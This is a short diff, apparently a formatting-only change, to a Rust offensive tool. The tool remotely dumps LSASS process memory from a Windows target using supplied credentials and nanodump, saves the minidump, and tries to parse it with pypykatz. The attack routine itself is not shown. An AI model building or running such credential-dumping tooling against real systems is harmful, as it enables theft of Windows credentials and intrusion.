@@ -188,9 +188,8 @@ async fn main() -> Result<()> {
                     .map_err(|e| anyhow::anyhow!(e))?;
 
                     // Save the minidump.
-                    std::fs::write(&dmp_out, &dump_bytes).map_err(|e| {
-                        anyhow::anyhow!("cannot write {}: {e}", dmp_out.display())
-                    })?;
+                    std::fs::write(&dmp_out, &dump_bytes)
+                        .map_err(|e| anyhow::anyhow!("cannot write {}: {e}", dmp_out.display()))?;
                     println!("[+] Minidump saved → {}", dmp_out.display());
 
                     // Try to auto-parse with pypykatz.
@@ -221,15 +220,12 @@ async fn main() -> Result<()> {
                 &password,
             );
             let technique_flag = format!("--{technique}");
-            let result = remote_lsass_dump(
-                &target,
-                &cred,
-                &nanodump_bytes,
-                &technique_flag,
-                &|line| println!("[nanodump] {line}"),
-            )
-            .await
-            .map_err(|e| anyhow::anyhow!(e))?;
+            let result =
+                remote_lsass_dump(&target, &cred, &nanodump_bytes, &technique_flag, &|line| {
+                    println!("[nanodump] {line}")
+                })
+                .await
+                .map_err(|e| anyhow::anyhow!(e))?;
 
             std::fs::write(&output, &result.dump_bytes)
                 .map_err(|e| anyhow::anyhow!("cannot write {}: {e}", output.display()))?;
